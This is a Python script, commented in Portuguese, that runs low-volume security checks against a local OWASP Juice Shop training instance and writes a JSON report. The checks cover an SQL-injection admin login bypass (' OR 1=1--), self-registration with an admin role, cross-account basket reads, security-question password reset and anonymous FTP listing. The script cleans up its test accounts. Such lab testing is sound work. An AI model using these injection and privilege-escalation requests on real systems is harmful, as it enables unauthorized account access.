"""Verificações HTTP de baixo volume, restritas à instância local do Juice Shop."""
import argparse
from datetime import datetime
import json
from pathlib import Path
import secrets
import re
from http.client import IncompleteRead
from urllib.error import HTTPError
from urllib.parse import quote
from urllib.request import Request, urlopen


def run(output):
    results=[]; accounts=[]; tokens={}
    base='http://127.0.0.1:3000'
    def request(method,path,data=None,token=None):
        headers={'Content-Type':'application/json'}
        if token: headers['Authorization']='Bearer '+token
        req=Request(base+path,data=json.dumps(data).encode() if data is not None else None,headers=headers,method=method)
        try: response=urlopen(req,timeout=10)
        except HTTPError as error: response=error
        try: raw=response.read()
        except IncompleteRead as error: raw=error.partial
        payload=raw.decode('utf-8','replace')
        try: content=json.loads(payload)
        except ValueError: content=payload
        return response.status,dict(response.headers),content
    def record(name,status,expected,detail=''):
        results.append({'verificacao':name,'http':status,'esperado':expected,'resultado':'conforme' if status in expected else 'divergente','observacao':detail})
        print(name, status)
    st,h,data=request('GET','/rest/admin/application-version')
    version=data.get('version') if isinstance(data,dict) else None
    record('Versão da aplicação',st,[200],str(version))
    st,h,data=request('POST','/rest/user/login',{'email':"' OR 1=1--",'password':'controle-invalido'})
    auth=data.get('authentication',{}) if isinstance(data,dict) else {}
    admin=auth.get('token')
    record('FX1: login administrativo por injeção SQL',st,[200],'Sessão obtida sem senha válida; token não armazenado no registro.')
    if admin:
        import base64
        payload=admin.split('.')[1]; claims=json.loads(base64.urlsafe_b64decode(payload+'='*(-len(payload)%4)))
        profile=claims.get('data',{})
        results.append({'verificacao':'FX1: conteúdo do JWT','resultado':'observado','campo_password_presente':'password' in profile,
                        'campo_exp_presente':'exp' in claims,'papel':profile.get('role'),'valores_de_credenciais':'omitidos'})
        # Recupera somente contas do padrão exclusivo desta rotina após interrupção.
        st,h,data=request('GET','/api/Users',token=admin)
        for previous in data.get('data',[]) if isinstance(data,dict) else []:
            if re.fullmatch(r'revisao-[0-9a-f]{12}@laboratorio\.invalid',previous.get('email','')):
                request('DELETE',f'/api/Users/{previous["id"]}',token=admin)
    # Contas criadas exclusivamente para ensaios e removidas ao final.
    for label,role in [('A','customer'),('B','customer'),('P','admin')]:
        email='revisao-'+secrets.token_hex(6)+'@laboratorio.invalid'
        password='M2!'+secrets.token_urlsafe(18)
        st,h,data=request('POST','/api/Users',{'email':email,'password':password,'passwordRepeat':password,'role':role})
        account=data.get('data',{}) if isinstance(data,dict) else {}
        uid=account.get('id')
        if uid: accounts.append({'id':uid,'email':email,'label':label,'password':password})
        record('FX2: cadastro da conta '+label,st,[201],'Papel devolvido: '+str(account.get('role')))
        if uid:
            st,h,data=request('POST','/rest/user/login',{'email':email,'password':password})
            a=data.get('authentication',{}) if isinstance(data,dict) else {}
            if a.get('token'): tokens[label]=a
            record('FX1: autenticação da conta '+label,st,[200])
    if 'A' in tokens and 'B' in tokens:
        basket=tokens['A']['bid']
        for label,token,expected in [('titular',tokens['A']['token'],[200]),('outro titular',tokens['B']['token'],[200]),('sem sessão',None,[401])]:
            st,h,data=request('GET',f'/rest/basket/{basket}',token=token)
            record('FX3: leitura de cesta por '+label,st,expected,'HTTP 200 por outra conta caracteriza ausência de autorização por objeto.')
        st,h,data=request('GET','/api/BasketItems',token=tokens['A']['token'])
        record('FX3: consulta autenticada dos itens',st,[200])
    first=next((a for a in accounts if a['label']=='A'),None)
    if first:
        st,h,data=request('POST','/api/SecurityAnswers',{'UserId':first['id'],'SecurityQuestionId':1,'answer':'resposta-controlada-m2'})
        record('FX2: associação de resposta em conta de teste',st,[201])
        if isinstance(data,dict) and data.get('data',{}).get('id'):
            first['answer_id']=data['data']['id']
        st,h,data=request('GET','/rest/user/security-question?email='+quote(first['email']))
        record('FX2: consulta pública da pergunta por e-mail',st,[200],'Pergunta recebida: '+str(isinstance(data,dict) and bool(data.get('question'))))
        st,h,data=request('POST','/rest/user/reset-password',{'email':first['email'],'answer':'errada','new':'Controle!SenhaNova123','repeat':'Controle!SenhaNova123'})
        record('FX2: reset com resposta incorreta',st,[401],'Cota declarada: '+str(h.get('X-RateLimit-Limit',h.get('x-ratelimit-limit'))))
        st,h,data=request('POST','/rest/user/reset-password',{'email':first['email'],'answer':'resposta-controlada-m2','new':'Controle!SenhaNova123','repeat':'Controle!SenhaNova123'})
        record('FX2: reset da própria conta com resposta correta',st,[200])
        st,h,data=request('POST','/rest/user/login',{'email':first['email'],'password':'Controle!SenhaNova123'})
        record('FX2: autenticação com a senha redefinida',st,[200])
    st,h,data=request('GET','/ftp/')
    record('FX3: listagem anônima do diretório HTTP',st,[200],'Listagem HTML observada: '+str(isinstance(data,str) and '<a' in data))
    for label,token in [('sem sessão',None),('cliente',tokens.get('B',{}).get('token')),('administrador',admin)]:
        for path in ['/rest/user/authentication-details','/rest/order-history']:
            if label!='sem sessão' and not token: continue
            st,h,data=request('GET',path,token=token)
            results.append({'verificacao':'FX4: '+path+' por '+label,'http':st,'resultado':'observado','quantidade_registros':len(data.get('data',[])) if isinstance(data,dict) and isinstance(data.get('data'),list) else None})
    # Falhas de autenticação têm baixo volume; não há teste de esgotamento.
    if first:
        codes=[]
        for _ in range(3):
            st,h,data=request('POST','/rest/user/login',{'email':first['email'],'password':'incorreta'})
            codes.append(st)
        results.append({'verificacao':'FX1: três falhas controladas de login','http':codes,'resultado':'observado','observacao':'Amostra limitada; não mede capacidade, bloqueio global ou abuso distribuído.'})
    cleanup=[]
    for a in reversed(accounts):
        if a.get('answer_id'):
            st,h,data=request('DELETE',f'/api/SecurityAnswers/{a["answer_id"]}',token=admin)
            cleanup.append({'tipo':'resposta de segurança de teste','http':st})
        st,h,data=request('DELETE',f'/api/Users/{a["id"]}',token=admin)
        cleanup.append({'tipo':'conta temporária '+a['label'],'http':st})
    report={'data':datetime.now().astimezone().isoformat(),'alvo':base,'versao':version,'metodo':'HTTP direto; baixo volume; contas temporárias; sem ensaio de estresse',
            'verificacoes':results,'limpeza':cleanup,'limites':'Não foram simulados esgotamento de disco/memória, concorrência, expiração temporal ou revogação em todas as rotas.'}
    output.write_text(json.dumps(report,ensure_ascii=False,indent=2),encoding='utf-8')
    print(json.dumps(report,ensure_ascii=False,indent=2))


if __name__=='__main__':
    ap=argparse.ArgumentParser(description=__doc__)
    ap.add_argument('--saida',type=Path,required=True)
    run(ap.parse_args().saida)
